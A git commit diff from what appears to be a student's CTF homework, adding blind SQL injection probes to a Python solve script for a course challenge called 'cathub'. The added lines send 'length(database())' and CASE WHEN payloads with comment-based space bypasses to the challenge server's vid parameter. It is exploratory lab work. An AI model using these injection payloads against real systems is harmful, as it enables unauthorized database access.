9e0e8a19282869a06b2da63074fe41965f35c44c
Alfons0329 <alfons.cs04@g2.nctu.edu.tw>
2019-11-11 20:14:26 +0800

    Try solving with python script

--- Hw0x04/cathub/solve.py
+++ Hw0x04/cathub/solve.py
@@ -5,10 +5,20 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 url = 'https://edu-ctf.csie.org:10159/video.php?vid='
 
+for i in range(0, 100):
+    url2 = url + '1/**/and/**/length(database())=' + str(i)
+    print(url2)
+    result = requests.get(url2, verify=False)
+    if 'Error' not in result.text:
+        print(result.text)
+
+input()
 for i in range(0, 255):
     print('---------------lognumber %d ----------'%(i))
 
-    payload = '(case/**/when/**/(' + str(chr(i)) +')/**/then/**/1/**/else/**/2/**/end)'
+    char = chr(i)
+    payload = '(case/**/when/**/(' + char +')/**/then/**/1/**/else/**/2/**/end)'
+    print(payload)
     url += payload
     result = requests.get(url, verify=False)
 
